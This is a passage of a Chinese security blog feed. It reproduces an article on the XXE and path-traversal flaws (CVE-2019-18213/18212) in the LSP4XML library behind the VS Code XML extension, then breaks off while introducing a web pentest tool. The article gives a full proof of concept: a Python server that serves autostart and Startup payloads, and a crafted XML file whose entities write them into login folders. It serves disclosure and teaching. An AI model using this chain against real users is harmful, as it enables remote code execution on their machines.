$HOME/Desktop/test.txt，从而导致任意文件写入。&lt;/p&gt;&lt;p&gt;唯一的限制就是缓存机制的第 3 点，因此无法覆盖任何文件，并且所有操作都是使用当前用户权限完成的（因此，如果当前用户是管理员，我们可以在任何地方写，否则只能在其主目录可写）。&lt;/p&gt;&lt;p&gt;可以通过滥用启动/自动启动机制来轻松实现RCE：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;在 Windows 系统上，通过将批处理文件引用为外部实体并使用遍历路径将其写入 $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ 文件夹中。&lt;/li&gt;&lt;li&gt;在大多数 GNU/Linux 系统上，通过在 $HOME/.config/autostart/ 文件夹中编写一个“desktop”文件。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;只需要等待受害者注销并再次在其计算机上登录以获得执行的代码即可。&lt;/p&gt;&lt;h2&gt;影响&lt;/h2&gt;&lt;p&gt;在完成 LSP4XML 的利用链之后，除 VSCode-XML 之外，还发现 Eclipse 的 wildwebdeveloper 扩展和 theia-xml-extension 也在使用该库，因此都容易受到攻击。&lt;/p&gt;&lt;h2&gt;实践&lt;/h2&gt;&lt;p&gt;以下是在 Windows 和 GNU/Linux 系统上利用 XXE 并实现 RCE 的步骤：&lt;/p&gt;&lt;p&gt;首先，安装 VS Code 和 vscode-xml 扩展&amp;lt;0.9.1版本（注意：目前最新为 0.10.1）。&lt;/p&gt;&lt;p&gt;创建 server.py（Python3）并运行&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header(&amp;#39;Content-type&amp;#39;, &amp;#39;application/octet-stream&amp;#39;)
        self.end_headers()
        if &amp;#39;.desktop&amp;#39; in self.path:
            self.wfile.write(b&amp;#39;[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c &amp;#34;id;read&amp;#34;\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true&amp;#39;)	
        else:
            self.wfile.write(b&amp;#39;start cmd.exe /k &amp;#34;whoami&amp;#34;&amp;#39;)
        
def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
    server_address = (&amp;#39;&amp;#39;, port)
    httpd = server_class(server_address, handler_class)
    print(&amp;#39;Starting httpd on port {}...&amp;#39;.format(port))
    httpd.serve_forever()
 
run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 VS code 中新建文件并输入：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE r [ 
    &amp;lt;!ENTITY linux SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop&amp;#34;&amp;gt;
    &amp;lt;!ENTITY windows SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat&amp;#34;&amp;gt; 
]&amp;gt;
&amp;lt;r&amp;gt;&amp;amp;linux;&amp;amp;windows;&amp;lt;/r&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后保存该 XML 文件。&lt;/p&gt;&lt;p&gt;观察对 Python3 Web 服务器的请求，当用户执行注销或登录，将执行注入命令（在 Windows 上打开“命令提示符”并执行 whoami 命令，在 GNU/Linux 上打开终端并执行 id 命令）&lt;/p&gt;&lt;p&gt;具体操作：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/wp-content/uploads/2019/10/Video-xxe-3.gif&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/wp-con&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;tent/uploads/2019/10/Video-xxe-3.gif&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;防范&lt;/h2&gt;&lt;p&gt;及时更新插件 VS Code-XML 的版本。&lt;/p&gt;&lt;p&gt;源自：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/dont-o&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;pen-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-17-103044773</guid>
<pubDate>Fri, 17 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>VS Code XML插件CVE漏洞：从XXE到RCE</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-16-103044773.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103044773&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-96a8fd622af532186aaf65a15caa3bb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;2019 年中，XXE 漏洞“横行”，相比以往而言，XXE 漏洞额外的多。例如：通过 OpenCMS 利用 Apache Solr&lt;/p&gt;&lt;p&gt;&lt;b&gt;LSP4XML（XML 语言服务器）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是一个XML语言具体实现语言服务器协议，可与任何编辑器使用支持该协议，以提供良好的支持XML语言。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/angelozerr/lsp4xml&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/angelozerr/l&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;sp4xml&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;用于解析 VSCode-XML 中的 XML 文件，Eclipse 的 wildwebdeveloper，theia-xml等的库。受到 XXE（CVE-2019-18213）的影响，通过打开恶意 XML 文件可导致 RCE（CVE-2019-18212）被利用。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;CVE-2019-18213：XXE &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18213&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18213&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;适用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml）中使用的 0.9.1 之前的 XML 语言服务器（aka lsp4xml）允许通过精心制作的 XML 文档进行 XXE，并生成 SSRF 及 SMB 连接启动等。存在于extensions / contentmodel / participants / diagnostics / LSPXMLParserConfiguration.java 中。&lt;br/&gt;CVE-2019-18212：目录遍历 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18212&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18212&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;0.9.1 之前的 XML 语言服务器（aka lsp4xml）中的 XMLLanguageService.java（用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml））允许远程攻击者通过目录遍历写入任意文件。&lt;/blockquote&gt;&lt;h2&gt;XXE 奇遇&lt;/h2&gt;&lt;p&gt;拿一个标准的 XXE payload，并带有指向我们监听网络服务器的外部 DTD，目标服务器无法执行对互联网的 HTTP 请求，所以按道理只会存在一个 DNS 的交互过程，但是随后收到了两个不同的 DNS 交互和一个 HTTP 请求，这是为什么？&lt;/p&gt;&lt;h2&gt;探究&lt;/h2&gt;&lt;p&gt;在我尝试找出交互的原因时，发现 HTTP 请求来自我自己的 IP 地址，这就奇怪了。&lt;/p&gt;&lt;p&gt;为了一探究竟，当我在 VS Code 中保存新的 XML payload 时，使用新的 Burp Collaborator 实例作为回调服务器重播所有操作步骤，并触发了 XXE。不过，可能和 VS Code 并没有任何关系。。。&lt;/p&gt;&lt;p&gt;所有，先检查了一遍 VS Code 的配置和插件等，然后发现安装了一个名为 XML 的插件，由 RedHat 发布的。（应该是 VS Code 推荐安装的）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;XML 该拓展插件的作用是提供了对创建和编辑 XML 文档的支持，它基于使用 Java 运行的 LSP4XML 语言服务器。&lt;/blockquote&gt;&lt;p&gt;第一想到的就是禁用它，然后再进行后面的实验步骤。&lt;/p&gt;&lt;p&gt;VSCode-XML 使你可以打开 XML / DTD / XSTL / XSD 文件并解析它们的语法错误，重点是根据 DTD / XSD 定义验证 XML / XSTL 文件。&lt;/p&gt;&lt;p&gt;可知 XXE 漏洞本身在于 LSP4XML：在安装了 VSCode-XML 的 VS Code 中打开 XML 文件编辑或保存时，LSP4XML 在本地解析文件并在 VS Code 界面中报错。&lt;/p&gt;&lt;p&gt;&lt;b&gt;以此构造一个恶意文件，当安装了 VSCode-XML 的 VS Code 的目标打开该 XML 文件时，实现一系列利用操作。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;尝试了在这种情况下使用的常见渗透方法，但是由于最近的 Java 版本（1.8+）和 URL 解析的结合，所有操作都失败了。&lt;/p&gt;&lt;p&gt;可以执行的只有：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;盲 SSRF&lt;/li&gt;&lt;li&gt;Windows 上的 NetNTLMv2 渗透&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;实验&lt;/h2&gt;&lt;p&gt;在玩 XXE 时，发现一种奇怪的的行为：url 仅搜索一次，再次进行操作就不会去搜索。应该是存在某种缓存机制，将 DTD 的文件下载并存储在某个地方。&lt;/p&gt;&lt;p&gt;&lt;b&gt;缓存机制：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;解析 XML 文件&lt;/li&gt;&lt;li&gt;如果引用了外部实体，则注明其 URL&lt;/li&gt;&lt;li&gt;通过检查目录 $HOME/.lsp4xml/cache/http/$host/$path_of_file，使用指定的 URL 验证来自同一主机的文件是否已被缓存&lt;/li&gt;&lt;li&gt;如果缓存条目不存在，则文件被下载并移至$HOME/.lsp4xml/cache/http/$host/$path_of_file&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;那么问题来了，路径能不能被控制？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果外部实体 URL 路径中包含 ../ 会发生什么？&lt;/p&gt;&lt;p&gt;经实验，缓存过程在保存缓存文件时会受到路径遍历的影响，从而可以在任意本地目录中写入任意远程文件。如果尚未创建所需的文件夹结构，此过程也能实现。&lt;/p&gt;&lt;h2&gt;从 XXE 到 RCE&lt;/h2&gt;&lt;p&gt;漏洞存在的原因是在缓存的最后一步，如果缓存条目不存在，则文件被下载并移至对应的目录，其中参数 $path_of_file 可被控制，比如外部实体的 URL 为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://attack.er/../../../../Desktop/test.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;缓存文件将被写入 $HOME/Desktop/test.txt，从而导致任意文件写入。&lt;/p&gt;&lt;p&gt;唯一的限制就是缓存机制的第 3 点，因此无法覆盖任何文件，并且所有操作都是使用当前用户权限完成的（因此，如果当前用户是管理员，我们可以在任何地方写，否则只能在其主目录可写）。&lt;/p&gt;&lt;p&gt;可以通过滥用启动/自动启动机制来轻松实现RCE：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;在 Windows 系统上，通过将批处理文件引用为外部实体并使用遍历路径将其写入 $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ 文件夹中。&lt;/li&gt;&lt;li&gt;在大多数 GNU/Linux 系统上，通过在 $HOME/.config/autostart/ 文件夹中编写一个“desktop”文件。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;只需要等待受害者注销并再次在其计算机上登录以获得执行的代码即可。&lt;/p&gt;&lt;h2&gt;影响&lt;/h2&gt;&lt;p&gt;在完成 LSP4XML 的利用链之后，除 VSCode-XML 之外，还发现 Eclipse 的 wildwebdeveloper 扩展和 theia-xml-extension 也在使用该库，因此都容易受到攻击。&lt;/p&gt;&lt;h2&gt;实践&lt;/h2&gt;&lt;p&gt;以下是在 Windows 和 GNU/Linux 系统上利用 XXE 并实现 RCE 的步骤：&lt;/p&gt;&lt;p&gt;首先，安装 VS Code 和 vscode-xml 扩展&amp;lt;0.9.1版本（注意：目前最新为 0.10.1）。&lt;/p&gt;&lt;p&gt;创建 server.py（Python3）并运行&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header(&amp;#39;Content-type&amp;#39;, &amp;#39;application/octet-stream&amp;#39;)
        self.end_headers()
        if &amp;#39;.desktop&amp;#39; in self.path:
            self.wfile.write(b&amp;#39;[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c &amp;#34;id;read&amp;#34;\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true&amp;#39;)	
        else:
            self.wfile.write(b&amp;#39;start cmd.exe /k &amp;#34;whoami&amp;#34;&amp;#39;)
        
def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
    server_address = (&amp;#39;&amp;#39;, port)
    httpd = server_class(server_address, handler_class)
    print(&amp;#39;Starting httpd on port {}...&amp;#39;.format(port))
    httpd.serve_forever()
 
run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 VS code 中新建文件并输入：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE r [ 
    &amp;lt;!ENTITY linux SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop&amp;#34;&amp;gt;
    &amp;lt;!ENTITY windows SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat&amp;#34;&amp;gt; 
]&amp;gt;
&amp;lt;r&amp;gt;&amp;amp;linux;&amp;amp;windows;&amp;lt;/r&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后保存该 XML 文件。&lt;/p&gt;&lt;p&gt;观察对 Python3 Web 服务器的请求，当用户执行注销或登录，将执行注入命令（在 Windows 上打开“命令提示符”并执行 whoami 命令，在 GNU/Linux 上打开终端并执行 id 命令）&lt;/p&gt;&lt;p&gt;具体操作：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/wp-content/uploads/2019/10/Video-xxe-3.gif&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/wp-con&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;tent/uploads/2019/10/Video-xxe-3.gif&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;防范&lt;/h2&gt;&lt;p&gt;及时更新插件 VS Code-XML 的版本。&lt;/p&gt;&lt;p&gt;源自：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/dont-o&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;pen-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-16-103044773</guid>
<pubDate>Thu, 16 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>web自动化渗透工具：Tishna</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-15-102917681.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/102917681&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c2abf4c7be5ea75d1e52dec644467e48_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;Tishna&lt;/h2&gt;&lt;p&gt;一个用于 Web 服务器、Web 应用程序到 Web 安全性的自动化渗透测试框架。是一套完整的服务器自动渗透测试框架，覆盖 web 应用层。&lt;/p&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/haroonawanofficial/Tishna-Automated-Web-Application-Hacker&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/haroonawanof&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;ficial/Tishna-Automated-Web-Application-Hacker&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;测试环境：Kali，Parrot OS，Black Arch，Termux，Android Led TV&lt;/p&gt;&lt;p&gt;&lt;b&gt;简介&lt;/b&gt;&lt;/p&gt;&lt;p&gt;包含了 62 个全自动选项，是一把可用于 web 渗透的利器。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;962&quot; data-rawheight=&quot;668&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;962&quot; data-original=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;962&quot; data-rawheight=&quot;668&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;962&quot; data-original=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-d84922d4201de60e7f07f4dcbc384f45_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;ul&gt;&lt;li&gt;Tishna 